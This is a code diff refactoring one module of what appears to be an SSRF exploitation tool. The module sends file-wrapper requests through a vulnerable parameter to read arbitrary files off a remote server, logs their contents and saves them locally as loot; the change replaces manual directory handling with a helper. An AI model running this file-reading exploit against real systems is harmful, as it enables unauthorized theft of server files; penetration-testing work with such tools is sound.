@@ -1,5 +1,4 @@
 import logging
-import os
 
 from core.utils import *
 
@@ -35,32 +34,21 @@ class exploit:
         if r is not None:
             default = r.text
 
-            # Create directory to store files
-            directory = requester.host
-            # Replace : with _ for window folder name safe
-            # https://www.ibm.com/docs/en/spectrum-archive-sde/2.4.1.0?topic=tips-file-name-characters
-            directory = directory.replace(":", "_")
-            if not os.path.exists(directory):
-                os.makedirs(directory)
-
-            for f in self.files:
-                r = requester.do_request(args.param, wrapper_file(f))
+            for remote_file in self.files:
+                r = requester.do_request(args.param, wrapper_file(remote_file))
                 diff = diff_text(r.text, default)
                 if diff != "":
                     # Display diff between default and ssrf request
-                    logging.info(f"\033[32mReading file\033[0m : {f}")
+                    logging.info(f"\033[32mReading file\033[0m : {remote_file}")
                     if bytes(diff, encoding="utf-8").startswith(self.file_magic["elf"]):
                         logging.info("ELF binary found - not printing to stdout")
                     else:
                         logging.info(diff)
 
                     # Write diff to a file
-                    filename = f.replace("\\", "_").replace("/", "_")
-                    logging.info(
-                        f"\033[32mWriting file\033[0m : {f} to {directory + '/' + filename}"
-                    )
-                    with open(directory + "/" + filename, "w", encoding="utf-8") as f:
-                        f.write(diff)
+                    output_path = loot_path(requester.host, remote_file)
+                    logging.info(f"\033[32mWriting file\033[0m : {remote_file} to {output_path}")
+                    output_path.write_text(diff, encoding="utf-8")
 
         else:
             logging.info("Empty response")
